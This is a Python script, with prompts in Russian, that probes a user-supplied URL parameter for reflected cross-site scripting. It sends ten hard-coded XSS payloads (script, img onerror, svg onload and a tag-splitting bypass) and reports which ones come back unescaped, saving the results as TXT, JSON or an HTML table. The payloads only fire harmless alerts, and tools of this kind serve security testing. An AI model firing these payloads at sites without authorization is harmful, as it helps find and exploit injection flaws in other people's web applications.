import datetime
import urllib.parse
import requests
import html
import json

resultjson = []

result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>",
    "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>"
]

def vibor():
    print("\nВыбери формат сохранения результата\n1-TXT\n2-JSON\n3-HTML")
    choice = input(": ").strip()
    return choice

save_format = vibor()

headers = {
    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
}

url = input("Введите url (например, https://example.com): ").strip()
param = input("Выбери имя параметра(например, q): ").strip()

print("\nПроверка на xss")

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{param}={encoded_payload}"

    try:
        response = requests.get(test_url, headers=headers)
        worked = payload in response.text
        print(f"{'сработал' if worked else 'не сработал'} {payload}")

        result_entry = {
            "payload": payload,
            "worked": worked,
            "url": test_url,
            "status_code": response.status_code
        }
        resultjson.append(result_entry)

        if save_format == "1":
            with open(f"{result}.txt", "a", encoding="utf-8") as f:
                f.write(f"{'сработал' if worked else 'не сработал'} {payload}\n")

        elif save_format == "2":
            with open(f"{result}.json", "w", encoding="utf-8") as jf:
                json.dump(resultjson, jf, ensure_ascii=False, indent=4)

        elif save_format == "3":
            html_content = """
                <!DOCTYPE html>
                <html lang="ru">
                <head>
                    <meta charset="UTF-8">
                    <title>Результаты XSS</title>
                    <style>
                        body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
                        table { border-collapse: collapse; width: 100%; background: white; }
                        th, td { border: 1px solid #ddd; padding: 8px; }
                        th { background: #222; color: white; }
                        tr:nth-child(even) { background: #f2f2f2; }
                        code { color: #c7254e; background: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
                    </style>
                </head>
                <body>
                    <h1>Результаты XSS</h1>
                    <table>
                        <tr>
                            <th>Payload</th>
                            <th>URL</th>
                            <th>Сработал?</th>
                            <th>Status Code</th>
                        </tr>
                """

            for entry in resultjson:
                safe_payload = html.escape(entry["payload"])
                safe_url = html.escape(entry["url"])
                html_content += f"""
                        <tr>
                            <td><code>{safe_payload}</code></td>
                            <td><a href="{safe_url}">{safe_url}</a></td>
                            <td>{"Да" if entry["worked"] else "Нет"}</td>
                            <td>{entry["status_code"]}</td>
                        </tr>
                    """

            html_content += """
                    </table>
                </body>
                </html>
                """

            with open(f"{result}.html", "w", encoding="utf-8") as hf:
                hf.write(html_content)

    except Exception as e:
        print(f"ошибка {e}")
